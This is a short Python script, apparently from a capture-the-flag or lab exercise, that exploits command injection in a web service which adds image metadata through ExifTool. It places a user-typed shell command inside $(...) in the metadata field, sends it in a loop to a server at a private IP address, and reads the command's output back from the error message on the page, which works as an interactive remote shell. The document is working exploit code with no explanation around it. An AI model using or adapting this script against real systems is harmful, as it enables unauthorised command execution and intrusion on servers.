import requests
import bs4

while True:
    url = "http://10.80.13.231:5123/process"

    payload = {
        'operation': 'add_metadata',
        'metadata_key': 'Comment',
        'metadata_value': f'\' + $({input("> ")}) + \''
    }

    files=[
        ('image',('file',open('./sample.jpg','rb'),'application/octet-stream'))
    ]

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Origin': 'http://10.80.13.231:5123',
    'Referer': 'http://10.80.13.231:5123/',
    'Content-Length': '10555',
    'Accept-Language': 'it-IT,it;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Priority': 'u=0, i'
    }

    response = requests.request("POST", url, headers=headers, data=payload, files=files)

    # Get everything between: "<p class="error">ExifTool failed: " and "</p>"
    soup = bs4.BeautifulSoup(response.text, 'html.parser')
    error_paragraph = soup.find('p', class_='error')
    if error_paragraph:
        extracted_output = error_paragraph.get_text().replace('ExifTool failed: ', '').strip()
        print("\n\n", extracted_output)
        continue